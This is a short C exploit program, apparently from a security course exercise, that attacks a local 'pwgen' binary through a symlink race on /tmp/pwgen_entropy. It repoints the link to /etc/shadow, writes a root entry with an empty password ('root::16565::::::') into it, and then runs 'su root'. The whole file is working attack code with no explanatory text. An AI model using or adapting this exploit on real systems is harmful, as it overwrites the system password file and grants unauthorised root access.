/*
* dummy exploit program
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include "shellcode.h"

#define TARGET "./pwgen"


int main(int argc, char *argv[])
{
  FILE *fp,*tmpfile;
  int i;
  char changeshadow[] ="root::16565::::::";




  tmpfile = fopen("/tmp/fakefile","w");
  fclose(tmpfile);

  symlink("/tmp/fakefile","/tmp/pwgen_entropy");//link to my own fake file
  fp = popen("./pwgen -e","w");//修改这里，使用相对路径
  system("rm /tmp/pwgen_entropy -f");//rm old link file
  symlink("/etc/shadow","/tmp/pwgen_entropy"); //link to shadow file
  fprintf(fp, "\n%s", changeshadow);
  fclose(fp);
  system("su root");
  exit(0);
}
